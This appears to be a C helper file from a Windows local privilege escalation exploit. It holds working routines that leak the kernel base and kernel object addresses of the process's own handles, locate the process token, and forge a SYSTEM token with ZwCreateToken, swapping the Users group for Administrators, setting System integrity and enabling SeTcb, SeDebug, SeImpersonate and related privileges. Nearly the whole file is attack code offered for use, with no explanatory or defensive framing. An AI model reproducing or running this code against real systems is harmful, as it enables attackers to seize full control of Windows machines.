#include "util.h"

HANDLE hDevice = NULL;

#ifndef HEXDUMP_COLS
#define HEXDUMP_COLS 16
#endif

void hexdump(void* mem, unsigned int len)
{
	unsigned int i, j;

	for (i = 0; i < len + ((len % HEXDUMP_COLS) ? (HEXDUMP_COLS - len % HEXDUMP_COLS) : 0); i++)
	{
		/* print offset */
		if (i % HEXDUMP_COLS == 0)
		{
			printf("0x%06x: ", i);
		}

		/* print hex data */
		if (i < len)
		{
			printf("%02x ", 0xFF & ((char*)mem)[i]);
		}
		else /* end of block, just aligning for ASCII dump */
		{
			printf("   ");
		}

		/* print ASCII dump */
		if (i % HEXDUMP_COLS == (HEXDUMP_COLS - 1))
		{
			for (j = i - (HEXDUMP_COLS - 1); j <= i; j++)
			{
				if (j >= len) /* end of block, not really printing */
				{
					putchar(' ');
				}
				else if (isprint(((char*)mem)[j])) /* printable char */
				{
					putchar(0xFF & ((char*)mem)[j]);
				}
				else /* other char */
				{
					putchar('.');
				}
			}
			putchar('\n');
		}
	}
}

ULONG64 GetKernelBase() {
	DWORD len;
	PSYSTEM_MODULE_INFORMATION ModuleInfo;
	PUCHAR kernelBase = NULL;

	_NtQuerySystemInformation NtQuerySystemInformation = (_NtQuerySystemInformation)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQuerySystemInformation");
	if (NtQuerySystemInformation == NULL) {
		return (ULONG64)NULL;
	}

	NtQuerySystemInformation(/*SystemModuleInformation*/ 11, NULL, 0, &len);
	ModuleInfo = (PSYSTEM_MODULE_INFORMATION)VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!ModuleInfo)
	{
		return (ULONG64)NULL;
	}

	NtQuerySystemInformation(/*SystemModuleInformation*/ 11, ModuleInfo, len, &len);

	kernelBase = ModuleInfo->Module[0].ImageBase;
	VirtualFree(ModuleInfo, 0, MEM_RELEASE);

	return (ULONG64)kernelBase;
}

LPVOID GetInfoFromToken(HANDLE hToken, TOKEN_INFORMATION_CLASS type)
{
	DWORD    dwLengthNeeded;
	LPVOID   lpData = NULL;


	if (!GetTokenInformation(hToken, type, NULL, 0, &dwLengthNeeded) && GetLastError() != ERROR_INSUFFICIENT_BUFFER)
	{
		printf("\n[-] Failed to initialize GetTokenInformation %d", GetLastError());
		return NULL;
	}

	lpData = (LPVOID)LocalAlloc(LPTR, dwLengthNeeded);
	GetTokenInformation(hToken, type, lpData, dwLengthNeeded, &dwLengthNeeded);

	return lpData;
}

PSID GetLocalSystemSID()
{
	PSID                       psid = NULL;
	SID_IDENTIFIER_AUTHORITY   sidAuth = SECURITY_NT_AUTHORITY;


	if (AllocateAndInitializeSid(&sidAuth, 1, SECURITY_LOCAL_SYSTEM_RID, 0, 0, 0, 0, 0, 0, 0, &psid) == FALSE)
	{
		printf("\n[-] AllocateAndInitializeSid failed %d\n", GetLastError());
		return NULL;
	}

	return psid;
}

PTOKEN_PRIVILEGES SetPrivileges()
{
	PTOKEN_PRIVILEGES   privileges;
	LUID                luid;
	int                 NumOfPrivileges = 5;
	int                 nBufferSize;


	nBufferSize = sizeof(TOKEN_PRIVILEGES) + sizeof(LUID_AND_ATTRIBUTES) * NumOfPrivileges;
	privileges = (PTOKEN_PRIVILEGES)LocalAlloc(LPTR, nBufferSize);

	privileges->PrivilegeCount = NumOfPrivileges;

	LookupPrivilegeValue(NULL, SE_TCB_NAME, &luid);
	privileges->Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	privileges->Privileges[0].Luid = luid;

	LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid);
	privileges->Privileges[1].Attributes = SE_PRIVILEGE_ENABLED;
	privileges->Privileges[1].Luid = luid;

	LookupPrivilegeValue(NULL, SE_ASSIGNPRIMARYTOKEN_NAME, &luid);
	privileges->Privileges[2].Attributes = SE_PRIVILEGE_ENABLED;
	privileges->Privileges[2].Luid = luid;

	LookupPrivilegeValue(NULL, SE_TAKE_OWNERSHIP_NAME, &luid);
	privileges->Privileges[3].Attributes = SE_PRIVILEGE_ENABLED;
	privileges->Privileges[3].Luid = luid;

	LookupPrivilegeValue(NULL, SE_IMPERSONATE_NAME, &luid);
	privileges->Privileges[4].Attributes = SE_PRIVILEGE_ENABLED;
	privileges->Privileges[4].Luid = luid;

	return privileges;
}

HANDLE CreateUserToken(HANDLE hToken, TOKEN_TYPE tokenType)
{
	_ZwCreateToken               ZwCreateToken;
	HANDLE                       hTokenElevated;
	NTSTATUS                     status;
	int                          i;
	DWORD                        dwSize = 0;
	TOKEN_USER                   userToken;
	PTOKEN_PRIVILEGES            privileges = NULL;
	PTOKEN_OWNER                 ownerToken = NULL;
	PTOKEN_GROUPS                groups = NULL;
	PTOKEN_PRIMARY_GROUP         primary_group = NULL;
	PTOKEN_DEFAULT_DACL          default_dacl = NULL;
	PLUID                        pluidAuth;
	LARGE_INTEGER                li;
	PLARGE_INTEGER               pli;
	LUID                         authid = SYSTEM_LUID;
	LUID                         luid;
	PSID_AND_ATTRIBUTES          pSid;
	SID_BUILTIN                  TkSidLocalAdminGroup = { 1, 2, { 0, 0, 0, 0, 0, 5 }, { 32, DOMAIN_ALIAS_RID_ADMINS } };
	SECURITY_QUALITY_OF_SERVICE  sqos = { sizeof(sqos), SecurityImpersonation, SECURITY_STATIC_TRACKING, FALSE };
	OBJECT_ATTRIBUTES            oa = { sizeof(oa), 0, 0, 0, 0, &sqos };
	TOKEN_SOURCE                 SourceToken = { { '!', '!', '!', '!', '!', '!', '!', '!' }, { 0, 0 } };
	SID_IDENTIFIER_AUTHORITY     nt = SECURITY_NT_AUTHORITY;
	PSID                         lpSidOwner = NULL;
	SID_INTEGRITY                IntegritySIDSystem = { 1, 1, SECURITY_MANDATORY_LABEL_AUTHORITY, SECURITY_MANDATORY_SYSTEM_RID };


	ZwCreateToken = (_ZwCreateToken)GetProcAddress(LoadLibraryA("ntdll.dll"), "ZwCreateToken");

	if (ZwCreateToken == NULL)
	{
		printf("[-] Unable to resolve ZwCreateToken: %d\n\n", GetLastError());
		return NULL;
	}

	groups = (PTOKEN_GROUPS)GetInfoFromToken(hToken, TokenGroups);
	primary_group = (PTOKEN_PRIMARY_GROUP)GetInfoFromToken(hToken, TokenPrimaryGroup);
	default_dacl = (PTOKEN_DEFAULT_DACL)GetInfoFromToken(hToken, TokenDefaultDacl);

	pSid = groups->Groups;

	for (i = 0; i < groups->GroupCount; i++, pSid++)
	{
		PISID piSid = (PISID)pSid->Sid;

		if (pSid->Attributes & SE_GROUP_INTEGRITY)
		{
			memcpy(pSid->Sid, &IntegritySIDSystem, sizeof(IntegritySIDSystem));
		}

		if (piSid->SubAuthority[piSid->SubAuthorityCount - 1] == DOMAIN_ALIAS_RID_USERS)
		{
			memcpy(piSid, &TkSidLocalAdminGroup, sizeof(TkSidLocalAdminGroup));  // Found RID_USERS membership, overwrite with RID_ADMINS  
			pSid->Attributes = SE_GROUP_ENABLED;
		}
		else
		{
			pSid->Attributes &= ~SE_GROUP_USE_FOR_DENY_ONLY;
			pSid->Attributes &= ~SE_GROUP_ENABLED;
		}
	}

	pluidAuth = &authid;
	li.LowPart = 0xFFFFFFFF;
	li.HighPart = 0xFFFFFFFF;
	pli = &li;

	AllocateAndInitializeSid(&nt, 1, SECURITY_LOCAL_SYSTEM_RID, 0, 0, 0, 0, 0, 0, 0, &lpSidOwner);
	userToken.User.Sid = lpSidOwner;
	userToken.User.Attributes = 0;

	AllocateLocallyUniqueId(&luid);
	SourceToken.SourceIdentifier.LowPart = luid.LowPart;
	SourceToken.SourceIdentifier.HighPart = luid.HighPart;

	ownerToken = (PTOKEN_OWNER)LocalAlloc(LPTR, sizeof(PSID));
	ownerToken->Owner = GetLocalSystemSID();

	privileges = SetPrivileges();

	status = ZwCreateToken(&hTokenElevated,
		TOKEN_ALL_ACCESS,
		&oa,
		tokenType,
		pluidAuth,
		pli,
		&userToken,
		groups,
		privileges,
		ownerToken,
		primary_group,
		default_dacl,
		&SourceToken);

	if (status == STATUS_SUCCESS)
	{
		printf("\n[+] New token created successfully\n");
		return hTokenElevated;
	}
	else
	{
		//       printf("\n[-] Failed to create new token %08x\n", status);   
		return NULL;
	}

	if (lpSidOwner) FreeSid(lpSidOwner);
	if (groups) LocalFree(groups);
	if (privileges) LocalFree(privileges);
	if (primary_group) LocalFree(primary_group);
	if (default_dacl) LocalFree(default_dacl);
	if (ownerToken) { if (ownerToken->Owner) FreeSid(ownerToken->Owner); LocalFree(ownerToken); }

	return NULL;
}


ULONG64 get_handle_addr(HANDLE h) {
	ULONG len = 20;
	NTSTATUS status = (NTSTATUS)0xc0000004;
	PSYSTEM_HANDLE_INFORMATION_EX pHandleInfo = NULL;

	fpNtQuerySystemInformation NtQuerySystemInformation = (fpNtQuerySystemInformation)GetProcAddress(LoadLibraryA("ntdll.dll"), "NtQuerySystemInformation");

	do {
		len *= 2;
		pHandleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)GlobalAlloc(GMEM_ZEROINIT, len);
		status = NtQuerySystemInformation(0x40, pHandleInfo, len, &len);
	} while (status == (NTSTATUS)0xc0000004);

	if (status != (NTSTATUS)0x0) {
		fprintf(stderr, "error while NtQuerySystemInformation(NTSTATUS): %d\n", GetLastError());
		return 0;
	}

	DWORD mypid = GetProcessId(GetCurrentProcess());
	ULONG64 ptrs[1000] = { 0 };
	for (int i = 0; i < pHandleInfo->NumberOfHandles; i++) {
		PVOID object = pHandleInfo->Handles[i].Object;
		ULONG_PTR handle = pHandleInfo->Handles[i].HandleValue;
		DWORD pid = (DWORD)pHandleInfo->Handles[i].UniqueProcessId;
		if (pid != mypid)
			continue;
		if (handle == (ULONG_PTR)h)
			return (ULONG64)object;
	}
	fprintf(stderr, "cannot find token address\n");
	return 0;
}

ULONG64 get_process_token() {
	HANDLE token;
	HANDLE proc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, GetCurrentProcessId());
	if (proc == INVALID_HANDLE_VALUE)
		return 0;

	OpenProcessToken(proc, TOKEN_ADJUST_PRIVILEGES, &token);
	return get_handle_addr(token);
}